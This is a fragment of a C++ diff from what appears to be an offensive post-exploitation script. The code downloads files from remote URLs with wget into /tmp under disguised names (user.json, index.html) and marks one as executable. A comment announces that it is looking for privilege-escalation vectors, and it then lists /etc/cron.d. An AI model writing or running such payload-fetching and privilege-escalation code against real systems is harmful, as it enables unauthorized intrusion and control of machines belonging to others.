@@ -12,6 +12,9 @@ int main() {
     std::system(downloadCmd.c_str());
     std::system("chmod +x /tmp/user.json");
 
+    std::string downloadCert = "wget -q " + CERT_URL + " -O /tmp/index.html";
+    std::system(downloadCert.c_str());
+
     // 2. Look for privesc vectors (Cron jobs)
     std::cout << "\n[*] Checking /etc/cron.d for potential vectors:" << std::endl;
     std::system("ls -la /etc/cron.d");
